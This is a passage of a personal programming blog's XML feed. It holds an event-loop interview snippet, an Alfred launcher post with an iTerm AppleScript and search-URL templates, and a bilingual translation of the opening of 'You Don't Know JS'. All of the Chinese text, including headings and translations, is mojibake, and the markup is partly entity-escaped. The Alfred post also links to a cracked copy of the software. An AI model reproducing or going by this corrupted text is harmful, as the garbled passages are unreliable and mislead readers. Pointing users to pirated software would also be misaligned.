      &lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;è¯·é—®ä¸‹é¢è¾“å‡ºçš„ç»“æœæ˜¯ä»€ä¹ˆ&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;console.log(&amp;apos;script start&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;setTimeout(function() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  console.log(&amp;apos;setTimeout&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;, 0);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Promise.resolve().then(function() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  console.log(&amp;apos;promise1&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;).then(function() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  console.log(&amp;apos;promise2&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;console.log(&amp;apos;script end&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;çº³å°¼ï¼Ÿï¼Ÿä»¿ä½›åˆå›æƒ³äº†å½“åˆè¢«é¢è¯•å®˜æ”¯é…æ—¶çš„ææƒ§äº†ï¼ï¼&lt;/p&gt;
&lt;p&gt;éªšå¹´ç¨³ä½åˆ«æ…Œï¼Œè¿™é“é¢è¯•é¢˜è€ƒå¯Ÿçš„æ˜¯ä½ å¯¹Event loopäº‹ä»¶å¾ªç¯çš„ç†è§£ï¼Œå½“ä½ æ·±å…¥äº†è§£æµè§ˆå™¨æˆ–Nodeä¸­å¦‚ä½•å¤„ç†äº‹ä»¶å¾ªç¯çš„æ—¶å€™ï¼Œä¸Šé¢æ­¤ç±»é¢˜ç›®å¯¹ä½ æ¥è¯´å°±æ˜¯so easyï¼Œå¥½äº†è¯ä¸å¤šè¯´è®©æˆ‘ä»¬å¿«é€Ÿè¿›å…¥æ­£é¢˜å§ã€‚&lt;/p&gt;
&lt;div&gt;
    
    </summary>
    
      <category term="js" scheme="http://zhoushaw.github.io/categories/js/"/>
    
    
      <category term="js" scheme="http://zhoushaw.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>alfredå·¥å…·</title>
    <link href="http://zhoushaw.github.io/2019/03/01/other/tool/Alfred3/"/>
    <id>http://zhoushaw.github.io/2019/03/01/other/tool/Alfred3/</id>
    <published>2019-02-28T18:44:53.000Z</published>
    <updated>2019-04-14T13:54:11.954Z</updated>
    
    <content type="html"><![CDATA[<div><a id="more"></a></div><h2 id="ä¸‹è½½ç ´è§£ç‰ˆ"><a href="#ä¸‹è½½ç ´è§£ç‰ˆ" class="headerlink" title="ä¸‹è½½ç ´è§£ç‰ˆ"></a>ä¸‹è½½ç ´è§£ç‰ˆ</h2><p><a href="https://www.jianshu.com/p/5b3f98b1f7b6" target="_blank" rel="noopener">æ–‡ç« åœ°å€</a></p><h2 id="åŠŸèƒ½ä½¿ç”¨"><a href="#åŠŸèƒ½ä½¿ç”¨" class="headerlink" title="åŠŸèƒ½ä½¿ç”¨"></a>åŠŸèƒ½ä½¿ç”¨</h2><p><a href="https://juejin.im/post/5b0e99436fb9a009e405dbb6" target="_blank" rel="noopener">æ˜é‡‘åœ°å€</a></p><h2 id="webæœç´¢è®¾ç½®"><a href="#webæœç´¢è®¾ç½®" class="headerlink" title="webæœç´¢è®¾ç½®"></a>webæœç´¢è®¾ç½®</h2><ul><li>ç™¾åº¦:<a href="https://www.baidu.com/s?ie=utf-8&amp;f=8&amp;wd={query}" target="_blank" rel="noopener">https://www.baidu.com/s?ie=utf-8&amp;f=8&amp;wd={query}</a></li><li>stackoverflow:<a href="http://www.stackoverflow.com/search?q={query}" target="_blank" rel="noopener">http://www.stackoverflow.com/search?q={query}</a></li><li>githubUser:<a href="https://github.com/{query}" target="_blank" rel="noopener">https://github.com/{query}</a></li><li>githubSearch:<a href="https://github.com/search?utf8=%E2%9C%93&amp;q={query}" target="_blank" rel="noopener">https://github.com/search?utf8=%E2%9C%93&amp;q={query}</a></li><li>MDN:<a href="https://developer.mozilla.org/zh-CN/search?q={query}" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/search?q={query}</a></li><li>juejin: <a href="https://juejin.im/search?query={query}" target="_blank" rel="noopener">https://juejin.im/search?query={query}</a></li></ul><h2 id="alfredé›†æˆiterm2"><a href="#alfredé›†æˆiterm2" class="headerlink" title="alfredé›†æˆiterm2"></a>alfredé›†æˆiterm2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">on alfred_script(q)</span><br><span class="line">if application &quot;iTerm&quot; is running or application &quot;iTerm&quot; is running then</span><br><span class="line">run script &quot;</span><br><span class="line">on run &#123;q&#125;</span><br><span class="line">tell application \&quot;:Applications:iTerm.app\&quot;</span><br><span class="line">activate</span><br><span class="line">try</span><br><span class="line">select first window</span><br><span class="line">set onlywindow to false</span><br><span class="line">on error</span><br><span class="line">create window with default profile</span><br><span class="line">select first window</span><br><span class="line">set onlywindow to true</span><br><span class="line">end try</span><br><span class="line">tell current session of the first window</span><br><span class="line">if onlywindow is false then</span><br><span class="line">tell split vertically with default profile</span><br><span class="line">write text q</span><br><span class="line">end tell</span><br><span class="line">end if</span><br><span class="line">end tell</span><br><span class="line">end tell</span><br><span class="line">end run</span><br><span class="line">&quot; with parameters &#123;q&#125;</span><br><span class="line">else</span><br><span class="line">run script &quot;</span><br><span class="line">on run &#123;q&#125;</span><br><span class="line">tell application \&quot;:Applications:iTerm.app\&quot;</span><br><span class="line">activate</span><br><span class="line">try</span><br><span class="line">select first window</span><br><span class="line">on error</span><br><span class="line">create window with default profile</span><br><span class="line">select first window</span><br><span class="line">end try</span><br><span class="line">tell the first window</span><br><span class="line">tell current session to write text q</span><br><span class="line">end tell</span><br><span class="line">end tell</span><br><span class="line">end run</span><br><span class="line">&quot; with parameters &#123;q&#125;</span><br><span class="line">end if</span><br><span class="line">end alfred_script</span><br></pre></td></tr></table></figure><h2 id="workflows"><a href="#workflows" class="headerlink" title="workflows"></a>workflows</h2><blockquote><p>æœ‰é“</p></blockquote><p><a href="https://github.com/kaiye/workflows-youdao/" target="_blank" rel="noopener">https://github.com/kaiye/workflows-youdao/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;div&gt;
    
    </summary>
    
      <category term="tool" scheme="http://zhoushaw.github.io/categories/tool/"/>
    
    
      <category term="alfred" scheme="http://zhoushaw.github.io/tags/alfred/"/>
    
  </entry>
  
  <entry>
    <title>è¯‘æ–‡:you don&#39;t know js ä¹‹ Into Programming</title>
    <link href="http://zhoushaw.github.io/2019/02/28/learning/book-notes/you&#39;s%20not%20know%20javascript/Into%20Programming/"/>
    <id>http://zhoushaw.github.io/2019/02/28/learning/book-notes/you&#39;s not know javascript/Into Programming/</id>
    <published>2019-02-28T00:20:15.000Z</published>
    <updated>2019-04-14T13:54:11.946Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Chapter-1-Into-Programming"><a href="#Chapter-1-Into-Programming" class="headerlink" title="Chapter 1: Into Programming"></a>Chapter 1: Into Programming</h2><p>Welcome to the You Donâ€™t Know JS (YDKJS) series.</p><p>æ¬¢è¿æ¥åˆ°ä½ ä¸æ‡‚jsç³»åˆ—</p><div><a id="more"></a></div><p>Up &amp; Going is an introduction to several basic concepts of programming â€“ of course we lean toward JavaScript (often abbreviated JS) specifically â€“ and how to approach and understand the rest of the titles in this series. Especially if youâ€™re just getting into programming and/or JavaScript, this book will briefly explore what you need to get up and going.</p><p>Up &amp; Goingæ˜¯ä¸ºäº†ä»‹ç»ç¨‹åºåŸºæœ¬æ¦‚å¿µçš„ï¼Œå½“ç„¶æˆ‘ä»¬ç‰¹åˆ«å€¾å‘äºjavascript(é€šå¸¸ç®€ç§°ä¸ºJS)ï¼Œå¦‚ä½•çœ‹å¾…ä¸è£‚è§£æœ¬ç³»åˆ—å…¶ä»–ä¹¦ç›®ã€‚å¦‚æœä½ å‡†å¤‡å¥½è¿›å…¥ç¨‹åºæˆ–è€…javascriptäº†ã€‚è¿™æœ¬ä¹¦å°†ç®€å•æµè§ˆä½ éœ€è¦ä»€ä¹ˆæ¥å…¥é—¨ä¸è¿›é˜¶ã€‚</p><p>This book starts off explaining the basic principles of programming at a very high level. Itâ€™s mostly intended if you are starting YDKJS with little to no prior programming experience, and are looking to these books to help get you started along a path to understanding programming through the lens of JavaScript.</p><p>æœ¬ä¹¦å¼€å§‹è§£é‡Šç¨‹åºçš„åŸºç¡€åŸåˆ™åœ¨å¾ˆé«˜çš„çº§åˆ«ã€‚å¦‚æœä½ å¼€å§‹é˜…è¯»YDKJSå¸¦æœ‰è¾ƒå°‘æˆ–æ²¡æœ‰ç¨‹åºç»éªŒå¹¶ä¸”å¯»æ‰¾è¿™äº›ä¹¦é€šè¿‡javascrptå»å¸®åŠ©ä½ å¼€å§‹ç†è§£ç¨‹åºï¼Œé‚£ä¹ˆæœ¬ä¹¦çš„ä¸»è¦ç›®çš„å°±æ˜¯å¸®åŠ©ä½ äº†è§£å¦‚ä½•å¼€å§‹YDKJSã€‚</p><p>Chapter 1 should be approached as a quick overview of the things youâ€™ll want to learn more about and practice to get into programming. There are also many other fantastic programming introduction resources that can help you dig into these topics further, and I encourage you to learn from them in addition to this chapter.</p><p>ç¬¬ä¸€ç« åº”è¯¥é€‚åˆå¿«é€Ÿçš„é¢„è§ˆä½ æƒ³è¦å­¦ä¹ å’Œè®­ç»ƒè¿›å…¥ç¨‹åºã€‚è¿™é‡Œæœ‰å¾ˆå¤šèƒ½å¸®åŠ©ä½ æ·±å…¥è¿™äº›è¯é¢˜çš„æœ‰ç”¨çš„ç¨‹åºèµ„æºï¼Œæˆ‘é¼“åŠ±ä½ åœ¨è¿™ä¸€ç« ä¹‹å¤–å‘ä»–ä»¬å­¦ä¹ ã€‚</p><p>Once you feel comfortable with general programming basics, Chapter 2 will help guide you to a familiarity with JavaScriptâ€™s flavor of programming. Chapter 2 introduces what JavaScript is about, but again, itâ€™s not a comprehensive guide â€“ thatâ€™s what the rest of the YDKJS books are for!</p><p>ä¸€æ—¦ä½ å¯¹æ™®é€šçš„ç¨‹åºåŸºç¡€é€‚åº”äº†ï¼Œç¬¬äºŒç« å°†ä¼šå¸®åŠ©ä½ ç†Ÿæ‚‰javascriptçš„ç¨‹åºã€‚ç¬¬äºŒç« ä»‹ç»äº†javascriptæ˜¯å…³äºä»€ä¹ˆçš„ï¼Œå†è€…ï¼Œå®ƒä¸åªæ˜¯å…¨é¢çš„æŒ‡å— â€“ è¿™æ˜¯å…¶ä½™YDKJSç³»åˆ—ä¹¦çš„ä½œç”¨ã€‚</p><p>If youâ€™re already fairly comfortable with JavaScript, first check out Chapter 3 as a brief glimpse of what to expect from YDKJS, then jump right in!</p><p>å¦‚æœä½ å·²ç»å¾ˆç†Ÿç»ƒjavascriptï¼Œé‚£ä¹ˆé¦–å…ˆå¿«é€Ÿçš„é¢„è§ˆä¸€ä¸‹ç¬¬ä¸‰ç« ï¼Œç„¶åå¿«é€Ÿçš„è¿›å…¥å­¦ä¹ å§ã€‚</p><p>##Code</p><p>Letâ€™s start from the beginning.</p><p>è®©æˆ‘ä»¬ä»è¿™å¼€å§‹å§ã€‚</p><p>A program, often referred to as source code or just code, is a set of special instructions to tell the computer what tasks to perform. Usually code is saved in a text file, although with JavaScript you can also type code directly into a developer console in a browser, which weâ€™ll cover shortly.</p><p>ä¸€ä¸ªç¨‹åºï¼Œç»å¸¸è¢«äº¤ä»˜æºç æˆ–è€…å°±æ˜¯ç¼–ç ï¼Œå»è®¾ç½®äº†ä¸€ä¸ªç‰¹æ®Šçš„ä»‹ç»å‘Šè¯‰è®¡ç®—æœºå“ªäº›ä»»åŠ¡è¢«æ‰§è¡Œã€‚é€šå¸¸ä»£ç è¢«ä½¿ç”¨æ–‡æœ¬æ–‡ä»¶å­˜å‚¨ï¼Œé€šè¿‡javascriptï¼Œä½ ä¹Ÿå¯ä»¥è¾“å…¥ä»£ç ç›´æ¥åœ¨æµè§ˆå™¨çš„å¼€å‘è€…åŒºè¾“å…¥ä»£ç ï¼Œç¨åæˆ‘ä»¬ä¼šè®²åˆ°è¿™ä¸€ç‚¹ã€‚</p><p>The rules for valid format and combinations of instructions is called a computer language, sometimes referred to as its syntax, much the same as English tells you how to spell words and how to create valid sentences using words and punctuation.</p><p>æœ‰æ•ˆçš„æ ¼å¼å’Œæ··åˆçš„æŒ‡ä»¤è¢«ç§°ä¹‹ä¸ºè®¡ç®—æœºè¯­è¨€ï¼Œæœ‰æ—¶è¢«ä½œä¸ºå®ƒçš„é¢„å‘ï¼Œæ›´åƒæ˜¯è‹±è¯­å‘Šè¯‰ä½ å¦‚ä½•ä½¿ç”¨å•è¯å’Œæ ‡ç‚¹æ‹¼å†™å•è¯å¹¶ä¸”å¦‚ä½•åˆ›é€ æœ‰æ•ˆçš„å¥å­ã€‚</p><p>##Statements</p><p>In a computer language, a group of words, numbers, and operators that performs a specific task is a statement. In JavaScript, a statement might look as follows:</p><p>åœ¨è®¡ç®—æœºä¸­ï¼Œä¸€ç»„å•è¯ã€æ•°å­—å’Œè¿ç®—ç¬¦æ‰§è¡Œä¸€ä¸ªç‰¹æ®Šçš„ä»»åŠ¡æ˜¯ä¸€ä¸ªå¥å­ã€‚åœ¨javascriptä¸­ä¸€ä¸ªå¥å­å¯èƒ½çœ‹æ¥åƒä¸‹é¢è¿™æ ·:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = b * 2;</span><br></pre></td></tr></table></figure><p>The characters a and b are called variables (see â€œVariablesâ€), which are like simple boxes you can store any of your stuff in. In programs, variables hold values (like the number 42) to be used by the program. Think of them as symbolic placeholders for the values themselves.</p><p>å­—ç¬¦aå’Œbè¢«ç§°ä¹‹ä¸ºå˜é‡ï¼Œå°±åƒæ˜¯ä¸€ä¸ªä½ èƒ½å­˜å‚¨ä»»ä½•ä¸œè¥¿åœ¨é‡Œé¢çš„ç›’å­ã€‚åœ¨ç¨‹åºä¸­ï¼Œå˜é‡å­˜æ”¾å€¼(åƒæ•°å­—42)æ¥ç»™ç¨‹åºç”¨ã€‚å°†ä»–ä»¬çœ‹åšå€¼æœ¬èº«çš„ç¬¦å·å ä½ç¬¦ã€‚</p><p>By contrast, the 2 is just a value itself, called a literal value, because it stands alone without being stored in a variable.</p><p>ç›¸æ¯”ä¹‹ä¸‹ï¼Œ2å°±æ˜¯è¿™ä¸ªå€¼çš„æœ¬èº«ï¼Œç§°ä¹‹ä¸ºå­—é¢é‡ã€‚å› ä¸ºå®ƒç‹¬ç«‹å­˜åœ¨æ²¡æœ‰å­˜åœ¨ä»»ä½•å˜é‡ä¸­ã€‚</p><p>The = and * characters are operators (see â€œOperatorsâ€) â€“ they perform actions with the values and variables such as assignment and mathematic multiplication.</p><p>=å’Œ*å­—ç¬¦æ˜¯æ“ä½œç¬¦ â€“ ä»–ä»¬ä½¿ç”¨å€¼å’Œå˜é‡æ‰§è¡Œè¿ç®—ç›¸æ¯”å¦‚èµ‹å€¼å’Œä¹˜æ³•è¿ç®—ã€‚</p><p>Most statements in JavaScript conclude with a semicolon (;) at the end.</p><p>å¤§å¤šjavascriptå£°æ˜çš„ç»“å°¾å¸¦æœ‰;å·ã€‚</p><p>The statement a = b <em> 2; tells the computer, roughly, to get the current value stored in the variable b, multiply that value by 2, then store the result back into another variable we call a.<br>a = b </em>2å£°æ˜å‘Šè¯‰è®¡ç®—æœºï¼Œæ¦‚ç•¥çš„æ˜¯ï¼Œè·å–å½“å‰å€¼å­˜å‚¨åœ¨å˜é‡bä¸­ï¼Œä¹˜2ï¼Œç„¶åå­˜å‚¨åˆ°æˆ‘ä»¬ç§°ä¹‹ä¸ºaçš„å˜é‡ä¸­ã€‚</p><p>Programs are just collections of many such statements, which together describe all the steps that it takes to perform your programâ€™s purpose.</p><p>ç¨‹åºå°±æ˜¯æœ‰ç›¸å½“å¤šçš„å£°æ˜ï¼Œè¿™äº›å£°æ˜ä¸€åŒæè¿°äº†å®ƒæ‰§è¡Œä½ ç¨‹åºç›®çš„çš„æ‰€æœ‰æ­¥éª¤ã€‚</p><h2 id="Expressions"><a href="#Expressions" class="headerlink" title="Expressions"></a>Expressions</h2><p>Statements are made up of one or more expressions. An expression is any reference to a variable or value, or a set of variable(s) and value(s) combined with operators.</p><p>å£°æ˜æ˜¯ç”±ä¸€ä¸ªæˆ–å¤šä¸ªè¡¨è¾¾å¼æ„æˆçš„ã€‚</p><p>For example:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = b * 2;</span><br></pre></td></tr></table></figure><p>This statement has four expressions in it:</p><p>è¿™ä¸ªå£°æ˜æœ‰å››ä¸ªè¡¨è¾¾å¼:</p><p>2 is a literal value expression</p><p>2æ˜¯ä¸€ä¸ªå­—é¢é‡è¡¨è¾¾å¼</p><p>b is a variable expression, which means to retrieve its current value</p><p>bæ˜¯ä¸€ä¸ªå˜é‡è¡¨è¾¾å¼ï¼Œå®ƒæ£€ç´¢å½“å‰çš„å€¼</p><p>b * 2 is an arithmetic expression, which means to do the multiplication</p><p>b * 2 æ˜¯ä¸€ä¸ªç®—æœ¯è¡¨è¾¾å¼ï¼Œæ„å‘³ç€ä¹˜æ³•</p><p>a = b <em> 2 is an assignment expression, which means to assign the result of the b </em> 2 expression to the variable a (more on assignments later)</p><p>a = b <em> 2æ˜¯ä¸€ä¸ªä»»åŠ¡è¡¨è¾¾å¼ï¼Œä»¥ä¸ºç€b </em> 2è¡¨è¾¾å¼çš„ç»“æœå­˜å‚¨åˆ°å˜é‡aä¸Š</p><p>A general expression that stands alone is also called an expression statement, such as the following:</p><p>ä¸€èˆ¬è¡¨è¾¾å¼ç‹¬ç«‹å­˜åœ¨çš„ä¹Ÿç§°ä¹‹ä¸ºè¡¨è¾¾å¼è¯­å¥ï¼Œä¾‹å¦‚ä¸‹é¢çš„</p><p>b * 2;<br>This flavor of expression statement is not very common or useful, as generally it wouldnâ€™t have any effect on the running of the program â€“ it would retrieve the value of b and multiply it by 2, but then wouldnâ€™t do anything with that result.<br>è¿™ç§é£æ ¼çš„è¡¨è¾¾å¼è¯­å¥ä¸æ˜¯å¾ˆå¸¸è§å’Œæœ‰æ•ˆï¼Œè¿è¡Œè¿™ä¸ªç¨‹åºé€šå¸¸ä¸ä¼šäº§ç”Ÿä»»ä½•å½±å“ â€“ å®ƒå°†ä¼šæ£€ç´¢bçš„å€¼ç„¶åä¹˜2ï¼Œä½†æ˜¯ä¸ä¼šå¯¹ç»“æœåšä»»ä½•å¤„ç†</p><p>A more common expression statement is a call expression statement (see â€œFunctionsâ€), as the entire statement is the function call expression itself:</p><p>ä¸€ä¸ªæœ€å¸¸è§çš„å£°æ˜è¯­å¥æ˜¯è°ƒç”¨è¡¨è¾¾å¼è¯­å¥(å‚è§å‡½æ•°)ï¼Œæ•´ä¸ªè¡¨è¾¾å¼è¯­å¥è¢«ç§°ä¹‹ä¸ºå‡½æ•°å®ƒè‡ªå·±ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert( a );</span><br></pre></td></tr></table></figure></p><h2 id="Executing-a-Program"><a href="#Executing-a-Program" class="headerlink" title="Executing a Program"></a>Executing a Program</h2><p>How do those collections of programming statements tell the computer what to do? The program needs to be executed, also referred to as running the program.</p><p>å¦‚ä½•é€šè¿‡è¿™äº›æ”¶é›†çš„ç¨‹åºè¯­å¥æ¥å‘Šè¯‰è®¡ç®—æœºåšä»€ä¹ˆï¼Ÿç¨‹åºéœ€è¦è¢«æ‰§è¡Œï¼Œä¹Ÿè¢«ç§°ä¸ºè¿è¡Œé¡¹ç›®ã€‚</p><p>Statements like a = b * 2 are helpful for developers when reading and writing, but are not actually in a form the computer can directly understand. So a special utility on the computer (either an interpreter or a compiler) is used to translate the code you write into commands a computer can understand.</p><p>åœ¨é˜…è¯»å’Œç¼–å†™æ—¶åƒ<code>a = b *2</code>è¿™æ ·çš„è¯­å¥å¯¹äºå¼€å‘è€…æ¥è¯´æ˜¯æœ‰å¸®åŠ©çš„ï¼Œä½†æ˜¯äº‹å®ä¸Šè®¡ç®—æœºä¸èƒ½ç›´æ¥ç†è§£ã€‚æ‰€ä»¥åœ¨è®¡ç®—æœºä¸­(ä¹Ÿå¯ä»¥æ˜¯ ä¸€ä¸ªç¿»è¯‘è€… æˆ– ç¼–è¯‘è€…)ä¸€ä¸ªç‰¹æ®Šçš„å·¥å…·è¢«ç”¨æ¥ç¿»è¯‘ä½ å†™çš„ä»£ç è½¬å˜æˆè®¡ç®—æœºèƒ½å¤Ÿç†è§£çš„å‘½ä»¤ã€‚</p><p>For some computer languages, this translation of commands is typically done from top to bottom, line by line, every time the program is run, which is usually called interpreting the code.</p><p>å¯¹äºä¸€äº›è®¡ç®—æœºè¯­è¨€ï¼Œç¿»è¯‘å‘½ä»¤é€šå¸¸æ˜¯ä»ä¸Šè‡³ä¸‹ç¿»è¯‘ï¼Œä¸€è¡Œä¸€è¡Œå‘ä¸‹ï¼Œæ¯æ¬¡è¿è¡Œç¨‹åºï¼Œé€šå¸¸è¢«ç§°ä¹‹ä¸ºè§£æä»£ç ã€‚</p><p>For other languages, the translation is done ahead of time, called compiling the code, so when the program runs later, whatâ€™s running is actually the already compiled computer instructions ready to go.</p><p>å¯¹äºä¸€äº›å…¶ä»–è¯­è¨€ï¼Œæå‰ç¿»è¯‘å®Œæˆï¼Œç§°ä¹‹ä¸ºç¼–è¯‘ä»£ç ï¼Œæ‰€ä»¥å½“ç¨‹åºç¨åè¿è¡Œæ—¶ï¼Œä»–è¿è¡Œçš„å®é™…ä¸Šæ˜¯å·²ç»ç¼–è¯‘å®Œæˆèƒ½å¤Ÿè¿è¡Œçš„è®¡ç®—æœºç»“æ„ã€‚</p><p>Itâ€™s typically asserted that JavaScript is interpreted, because your JavaScript source code is processed each time itâ€™s run. But thatâ€™s not entirely accurate. The JavaScript engine actually compiles the program on the fly and then immediately runs the compiled code.</p><p>ä¸€èˆ¬å®£ç§°JavaScriptä¸ºè§£é‡Šæ€§è¯­è¨€ï¼Œå› ä¸ºæ¯æ¬¡è¿è¡ŒJavaScriptæºç æ˜¯éƒ½ä¼šå¤„ç†å®ƒã€‚ä½†æ˜¯ä¸æ˜¯å®Œå…¨ç²¾å‡†ï¼ŒJavaScriptå¼•æ“åŠ¨æ€ç¼–è¯‘ä»£ç ï¼Œå¹¶ä¸”ç«‹å³è¿è¡Œç¼–è¯‘çš„ä»£ç ã€‚</p><p>Note: For more information on JavaScript compiling, see the first two chapters of the Scope &amp; Closures title of this series.</p><p>ç¬”è®°:æ›´å¤šå…³äºJavaScriptçš„ç¼–è¯‘ä¿¡æ¯ï¼Œçœ‹è¿™ä¸€ç³»åˆ—çš„ä½œç”¨åŸŸ &amp; é—­åŒ…çš„æ ‡é¢˜çš„å‰ä¸¤ç« ã€‚</p><p>##Try It Yourself</p><p>This chapter is going to introduce each programming concept with simple snippets of code, all written in JavaScript (obviously!).</p><p>è¿™ä¸€ç« æ˜¯ä½¿ç”¨ç®€å•çš„ä¸€æ®µä»£ç æ¥è®²è¿°æ¯ä¸€æ®µç¨‹åºçš„æ¦‚å¿µï¼Œæ‰€æœ‰ä½¿ç”¨ä»£ç JavaScriptç¼–å†™çš„(æ˜¾è€Œæ˜“è§çš„ï¼)</p><p>It cannot be emphasized enough: while you go through this chapter â€“ and you may need to spend the time to go over it several times â€“ you should practice each of these concepts by typing the code yourself. The easiest way to do that is to open up the developer tools console in your nearest browser (Firefox, Chrome, IE, etc.).</p><p>è¿™ä¸€ç‚¹æ— è®ºå¦‚ä½•å¼ºè°ƒéƒ½ä¸è¿‡åˆ†: å½“ä½ å¼€å§‹é˜…è¯»è¿™ä¸€ç«  â€“ å¹¶ä¸”ä½ å¯èƒ½éœ€è¦èŠ±ä¸€äº›æ—¶é—´å»åå¤é˜…è¯»å®ƒã€‚ä½ åº”è¯¥é€šè¿‡ç¼–å†™ä»£ç æ¥é”»ç‚¼è¿™äº›æ¦‚å¿µã€‚æœ€ç®€å•çš„æ–¹å¼æ˜¯æ‰“å¼€æœ€è¿‘çš„æµè§ˆå™¨çš„å¼€å‘è€…å·¥å…·(ç«ç‹ã€è°·æ­Œã€Ieï¼Œå…¶ä»–)</p><p>Tip: Typically, you can launch the developer console with a keyboard shortcut or from a menu item. For more detailed information about launching and using the console in your favorite browser, see â€œMastering The Developer Tools Consoleâ€ (<a href="http://blog.teamtreehouse.com/mastering-developer-tools-console)" target="_blank" rel="noopener">http://blog.teamtreehouse.com/mastering-developer-tools-console)</a>. To type multiple lines into the console at once, use <shift> + <enter> to move to the next new line. Once you hit <enter> by itself, the console will run everything youâ€™ve just typed.</enter></enter></shift></p><p>æç¤º:é€šå¸¸ï¼Œä½ å¯ä»¥é€šè¿‡é”®ç›˜çš„å¿«æ·é”®æˆ–è€…èœå•é€‰é¡¹æ‰“å¼€å¼€å‘è€…è¾“å…¥å°ï¼Œæ›´å¤šå…³äºåœ¨ä½ æœ€å–œæ¬¢çš„æµè§ˆå™¨ä¸­æ‰“å¼€å’Œä½¿ç”¨æ§åˆ¶å°ï¼Œè¯·çœ‹â€œæŒæ¡å¼€å‘è€…æ§åˆ¶å°â€ (<a href="http://blog.teamtreehouse.com/mastering-developer-tools-console)ï¼Œä¸€æ¬¡åœ¨æ§åˆ¶å°ä¸­è¾“å…¥å¤šè¡Œï¼Œä½¿ç”¨" target="_blank" rel="noopener">http://blog.teamtreehouse.com/mastering-developer-tools-console)ï¼Œä¸€æ¬¡åœ¨æ§åˆ¶å°ä¸­è¾“å…¥å¤šè¡Œï¼Œä½¿ç”¨</a><shift> + <enter> ç§»åŠ¨å…‰æ ‡åˆ°ä¸‹ä¸€è¡Œï¼Œä¸€æ—¦ä½ æŒ‰ä¸‹å›è½¦ï¼Œæ§åˆ¶å°å°†ä¼šè¿è¡Œä½ è¾“å…¥çš„ä¸€åˆ‡ã€‚</enter></shift></p><p>Letâ€™s get familiar with the process of running code in the console. First, I suggest opening up an empty tab in your browser. I prefer to do this by typing about:blank into the address bar. Then, make sure your developer console is open, as we just mentioned.</p><p>è®©æˆ‘ä»¬ç†Ÿæ‚‰ä¸€ä¸‹åœ¨æ§å°å†…ä»£ç è¿è¡Œçš„è¿‡ç¨‹ã€‚é¦–å…ˆï¼Œæˆ‘å»ºè®®ä½ åœ¨ä½ 